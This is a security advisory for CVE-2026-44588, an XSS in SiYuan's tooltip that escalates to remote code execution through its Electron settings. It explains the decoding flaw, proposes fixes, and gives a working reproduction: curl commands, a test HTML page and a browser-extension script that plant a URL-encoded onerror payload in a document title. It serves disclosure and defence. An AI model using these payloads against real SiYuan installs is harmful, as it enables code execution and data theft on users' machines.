# [C] SiYuan: Electron Renderer RCE via decodeURIComponent-driven tooltip XSS in aria-label sink (incomplete fix for CVE-2026-34585)

## Summary
Severity: Critical
Advisory: GHSA-25rp-h46x-2hjm
CVE: CVE-2026-44588
CWE: CWE-116, CWE-1188, CWE-79
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2026-05-08
Source: https://github.com/advisories/GHSA-25rp-h46x-2hjm
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0

## Details
## Summary

The tooltip mouseover handler in `app/src/block/popover.ts` reads `aria-label` via `getAttribute` and passes it through `decodeURIComponent` before assigning to `messageElement.innerHTML` in `app/src/dialog/tooltip.ts:41`. The encoder used at the producer side, `escapeAriaLabel` in `app/src/util/escape.ts:19-25`, only handles HTML special characters (`"`, `'`, `<`, literal `&lt;`) — it leaves `%XX` URL-escapes untouched. So a doc title containing `%3Cimg src=x onerror=...%3E` round-trips through `escapeAriaLabel` and the HTML attribute layer unmodified. Then `decodeURIComponent` on the consumer side converts `%3C` to a literal `<` character (a real `<`, NOT a character reference). When that string is assigned to `innerHTML`, the HTML5 tokenizer enters TagOpenState on the literal `<`, parses the `<img>` element, and the `onerror` handler fires.

Because the renderer runs with `nodeIntegration: true, contextIsolation: false, webSecurity: false` (`app/electron/main.js:407-411`), `require('child_process')` is reachable from the injected handler, escalating to arbitrary code execution.

Doc titles, AV column names + descriptions, AV select options, file-tree tooltips all reach this sink because they're rendered into `class="ariaLabel"` elements with `aria-label="${escapeAriaLabel(...)}"`. Doc title is the easiest plant — any user with create/rename access lands the payload, and the file survives `.sy.zip` round-trip without modification.

## Why a "double HTML-decode" framing is wrong

A naïve reading of the chain might suggest that `&amp;lt;` (the encoder output) decodes once at attribute-parse time to `&lt;`, then a second time at `innerHTML` time to `<` — yielding a tag. **That's incorrect** and confirmed false by direct browser testing. Per the HTML5 spec, character references in DataState produce CHARACTER tokens (text), not TagOpenState transitions: the `<` resulting from a `&lt;` reference is text data, never a tag-open delimiter. So the HTML-entity-only payload renders as visible literal text, not as a tag.

The actual bypass relies on `decodeURIComponent` producing a **literal** `<` (not a character reference) before `innerHTML` parses it. Literal `<` characters in the input stream DO trigger TagOpenState. URL encoding is the right vehicle because the encoder ignores `%XX` while the consumer chain decodes it.

## Details

**Encoder.** `app/src/util/escape.ts:19-25`:
```ts
export const escapeAriaLabel = (html: string) => {
    if (!html) { return html; }
    return html.replace(/"/g, "&quot;").replace(/'/g, "&apos;")
        .replace(/</g, "&amp;lt;").replace(/&lt;/g, "&amp;lt;");
};
```
The four replacements only cover HTML special chars. `%XX` URL escapes are not touched.

**Source — search-result rendering.** `app/src/search/util.ts:1406`:
```ts
<span class="b3-list-item__text ariaLabel" ... aria-label="${escapeAriaLabel(title)}">${escapeGreat(title)}</span>
```
Same pattern at `:1448`, `protyle/render/av/blockAttr.ts:205`, `protyle/render/av/col.ts:134`, `protyle/render/av/select.ts:36`, `search/unRef.ts:113`. The `title` is built from `getNotebookName(item.box) + getDisplayName(item.hPath, false)` (line 1398). The `hPath` returned by `/api/search/fullTextSearchBlock` carries the user-set doc title verbatim — `%XX` URL-escapes pass through, only HTML special chars are entity-encoded by the kernel.

**Consumer.** `app/src/block/popover.ts:33,144`:
```ts
let tip = aElement.getAttribute("aria-label") || "";       // literal stored attribute value
// ... branch logic that doesn't apply to plain search results ...
showTooltip(decodeURIComponent(tip), aElement, ...);       // ← decodes %XX into raw chars
```
`decodeURIComponent` is presumably present to handle URL-encoded asset paths in some hyperlink tooltips, but it's applied unconditionally to every aria-label-sourced tip — that's what enables this bypass.

**Sink.** `app/src/dialog/tooltip.ts:41`:
```ts
messageElement.innerHTML = message;     // ← HTML parser sees the now-decoded raw `<` and starts parsing tags
```

**Decode-chain trace** for in-memory title `%3Cimg src=x onerror="alert('SiYuan')"%3E` (URL-encoded `<` `>` `'`, literal `"`):

| step | result |
|------|--------|
| in-memory title | `%3Cimg src=x onerror="alert('SiYuan')"%3E` |
| `escapeAriaLabel` writes (only `"` and `'` get encoded — neither appears here as raw chars when `'` is `%27`) | `%3Cimg src=x onerror=&quot;alert(%27SiYuan%27)&quot;%3E` |
| HTML attribute set: `aria-label="..."` ; browser one-decodes named entities when storing | in-DOM value = `%3Cimg src=x onerror="alert(%27SiYuan%27)"%3E` |
| `getAttribute("aria-label")` | `%3Cimg src=x onerror="alert(%27SiYuan%27)"%3E` (verbatim) |
| `decodeURIComponent(tip)` | **`<img src=x onerror="alert('SiYuan')">`** (real `<` `'` `>` chars) |
| `messageElement.innerHTML = …` | HTML parser tokenizes raw `<img>`, creates element, fails to load `src=x`, fires `onerror` → JS runs |

**Renderer + reachability.** Renderer posture and auto-admin gates same as the AV-name advisory (Advisory 1): `nodeIntegration:true, contextIsolation:false, webSecurity:false` at `app/electron/main.js:407-411`; empty-`AccessAuthCode` local auto-admin at `kernel/model/session.go:261-287`; `chrome-extension://` Origin allowlist at `session.go:277`.

## Suggested fix

1. **Primary — `app/src/dialog/tooltip.ts:41`**: replace
   ```ts
   messageElement.innerHTML = message;
   ```
   with
   ```ts
   messageElement.textContent = message;
   ```
   For tooltips that legitimately need markup (memo rendering, hyperlink preview cards), introduce an explicit `{html: true}` flag on `showTooltip(...)` and route the message through `DOMPurify.sanitize(message)` before assigning to `innerHTML`.

2. **Drop `decodeURIComponent` at `popover.ts:144`** for the generic aria-label path. Apply it only on the few callers that intentionally pass URL-encoded asset paths (e.g. the local-asset hyperlink preview branch already inside the function), and apply it inside `try`/`catch` with a clear scope. Aria-label content is not URL-encoded by design; decoding it is a footgun that converts otherwise-safe attributes into pre-parsed HTML.

3. **Consolidate the four escape helpers** in `app/src/util/escape.ts` (`escapeHtml`, `escapeAttr`, `escapeAriaLabel`, `escapeGreat`) into one `Lute.EscapeHTMLStr`-equivalent that escapes `&`, `<`, `>`, `"`, `'`. Context-specific encoders without compile-time enforcement keep producing bug-class variants.

4. **(Defense-in-depth)** Switch the main BrowserWindow to `contextIsolation: true` with a preload bridge — caps every future renderer XSS at "DOM only," not RCE.

---

## Reproduction (copy-paste-ready)

Tested on Windows with SiYuan v3.6.5 (kernel + Electron) and Microsoft Edge as the offline parser-validation engine. Linux/macOS users substitute `py` with `python3` and use any modern Chromium-based browser (Edge/Chrome/Brave) for the standalone validation step.

### Prereqs

1. **Install SiYuan v3.6.5** from https://github.com/siyuan-note/siyuan/releases and launch once. **Do not set an `AccessAuthCode`** (default).
2. Verify the kernel is up:
   ```sh
   curl -s http://127.0.0.1:6806/api/system/version
   # → {"code":0,"msg":"","data":"3.6.5"}
   ```
3. Create at least one notebook (the file tree's "+" button) so `lsNotebooks` returns a usable id. Pin variables:
   ```sh
   API=http://127.0.0.1:6806
   NOTEBOOK_ID=$(curl -s -X POST $API/api/notebook/lsNotebooks \
     -H 'Content-Type: application/json' -d '{}' \
     | python -c 'import sys,json; print(json.load(sys.stdin)["data"]["notebooks"][0]["id"])')
   echo "Using notebook: $NOTEBOOK_ID"
   ```

### Step A — Browser-only validation of the chain (no SiYuan needed)

This proves the bug class on its own. Save as `decode-chain.html`, open in any Chromium-based browser:

```html
<!doctype html>
<html><body>
<h2 id="status">Click "Simulate" — if status turns red, the chain works.</h2>
<span id="src" class="ariaLabel"
      aria-label="%3Cimg src=x onerror=&quot;document.getElementById('status').innerText='RESULT: payload fired — chain works'; document.getElementById('status').style.color='red';&quot;%3E"
      hidden></span>
<button onclick="
  let tip = document.getElementById('src').getAttribute('aria-label');
  console.log('after getAttribute:', JSON.stringify(tip));
  try { tip = decodeURIComponent(tip); } catch(e){}
  console.log('after decodeURIComponent:', JSON.stringify(tip));
  document.getElementById('out').innerHTML = tip;
">Simulate SiYuan tooltip</button>
<div id="out" style="border:2px solid red; padding:1em; min-height:3em; margin-top:1em;"></div>
</body></html>
```

Click the button. The `<h2 id="status">` flips to red with "RESULT: payload fired — chain works", and the `<div id="out">` contains a fully-rendered `<img>` element (not text). Confirms the chain decodes URL-escapes between `getAttribute` and `innerHTML`, producing real tag-open characters.

### Step B — Plant the payload in SiYuan

```sh
DOC_ID=$(curl -s -X POST $API/api/filetree/createDocWithMd \
  -H 'Content-Type: application/json' \
  -d "{\"notebook\":\"$NOTEBOOK_ID\",\"path\":\"/tooltip-xss-poc-$$\",\"markdown\":\"trigger me — open the search panel, type 'trigger', and hover this result\"}" \
  | python -c 'import sys,json; print(json.load(sys.stdin)["data"])')
echo "DOC: $DOC_ID"

curl -s -X POST $API/api/filetree/renameDocByID \
  -H 'Content-Type: application/json' \
  --data-binary @- <<EOF
{"id":"$DOC_ID","title":"%3Cimg src=x onerror=\"alert('SiYuan tooltip-XSS PoC')\"%3E"}
EOF
```
Verify the in-memory title round-trips:
```sh
curl -s -X POST $API/api/block/getDocInfo \
  -H 'Content-Type: application/json' -d "{\"id\":\"$DOC_ID\"}" \
  | python -c 'import sys,json; print(json.load(sys.stdin)["data"]["ial"]["title"])'
# Expected:
# %3Cimg src=x onerror="alert('SiYuan tooltip-XSS PoC')"%3E
```

### Step C — Trigger inside SiYuan

In the SiYuan desktop client:
1. Open the search panel (`Ctrl+P` / `⌘+P`).
2. Type `trigger`.
3. The result list renders the doc with `aria-label="${escapeAriaLabel(title)}"`. The DOM attribute now contains `%3Cimg src=x onerror="alert('SiYuan tooltip-XSS PoC')"%3E` (URL-escapes survived; `&quot;` came from escapeAriaLabel and was decoded by the attribute parser to `"`).
4. **Hover the result row.** `popover.ts:33` reads the attribute, `popover.ts:144` calls `decodeURIComponent` (decoding `%3C`/`%27`/`%3E` to literal `<`/`'`/`>`), `tooltip.ts:41` writes `innerHTML` — HTML parser creates a real `<img>` element, `onerror` fires.
5. **`alert('SiYuan tooltip-XSS PoC')` pops.**

### Step D — `.sy.zip` reproducer for upstream review

For maintainers who want a single-click reproducer:
```sh
ZIP_PATH=$(curl -s -X POST $API/api/export/exportSY \
  -H 'Content-Type: application/json' -d "{\"id\":\"$DOC_ID\"}" \
  | python -c 'import sys,json; print(json.load(sys.stdin)["data"]["zip"])')
# The kernel re-encodes % in the URL, so it's simpler to grab from disk:
SRC=$(ls -1t "$HOME/SiYuanWorkspace/temp/export"/*.sy.zip | head -1)
cp "$SRC" "$HOME/Desktop/tooltip-xss-poc.sy.zip"
```
Maintainer reproduces by importing via right-click a notebook → **Import** → **SiYuan `.sy.zip`** → searching `trigger` → hovering the result. The Lute serialization stores the title in the `.sy` file with `%XX` preserved literally and `"` HTML-entity-encoded — the IAL parser decodes the entities on load, leaving the URL escapes intact, which then feeds the `decodeURIComponent`-based bypass.

### Step E — Browser-extension attack vector (the realistic remote path)

A malicious or compromised installed browser extension's content/background script runs with `chrome-extension://<id>` Origin, allowlisted by `session.go:277`. The extension can run Step B's curl chain via `fetch()` without any SiYuan UI interaction beyond keeping the kernel running:
```js
(async () => {
  const api = (path, body) => fetch('http://127.0.0.1:6806' + path, {
    method: 'POST', headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(body)
  }).then(r => r.json());
  const nb = await api('/api/notebook/lsNotebooks', {});
  const id = (await api('/api/filetree/createDocWithMd', {
    notebook: nb.data.notebooks[0].id,
    path: '/x' + Date.now(),
    markdown: 'trigger'
  })).data;
  await api('/api/filetree/renameDocByID', {
    id,
    title: `%3Cimg src=x onerror="alert('SiYuan tooltip-XSS PoC')"%3E`
  });
})();
```
A page from `https://attacker.com` is rejected — `IsLocalOrigin` only matches localhost/loopback. Realistic remote vectors: **browser extensions**, **localhost-served webpages**, **shared `.sy.zip` imports**, **sync replication from a co-author's compromised device**.

### Cleanup

```sh
DOC_ID=$(curl -s -X POST $API/api/filetree/searchDocs \
  -H 'Content-Type: application/json' -d '{"k":"trigger me"}' \
  | python -c 'import sys,json; r=json.load(sys.stdin)["data"]; print(r[0]["id"] if r else "")')
[ -n "$DOC_ID" ] && curl -s -X POST $API/api/filetree/removeDocByID \
  -H 'Content-Type: application/json' -d "{\"id\":\"$DOC_ID\"}"
```

## Impact

- **RCE on the victim's desktop**, triggered by hovering a search result (or any other `class="ariaLabel"` element rendering attacker-controlled metadata).
- **Doc titles are the most commonly-shared field** — recipients of `.sy.zip`, Bazaar templates, and sync peers all import the malicious title automatically; the URL encoding survives every transport.
- Same post-RCE consequences as Advisory 1: full filesystem read (incl. `~/.ssh/`, `~/.aws/credentials`, workspace `conf/conf.json`), persistence, cloud-account pivot.
- **Multiple alternative trigger surfaces** beyond search results: AV column names + descriptions, AV select-cell options, file-tree tooltips — any element with `class="ariaLabel"` and `aria-label="${escapeAriaLabel(...)}"` reaches the same `popover.ts → tooltip.ts` chain.
- **CVE-2026-34585 fix is incomplete.** The encoder-side hardening assumed exactly one HTML decode between encoder and DOM. It did not account for `decodeURIComponent` being applied to the consumer-side attribute value, which converts URL-escapes that the encoder ignored into literal `<` characters that initiate tag parsing. A consumer-side fix (`textContent`, or `DOMPurify.sanitize` on the rich-text path; and removing the unconditional `decodeURIComponent`) is required.

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-25rp-h46x-2hjm
- https://nvd.nist.gov/vuln/detail/CVE-2026-44588
- https://github.com/siyuan-note/siyuan
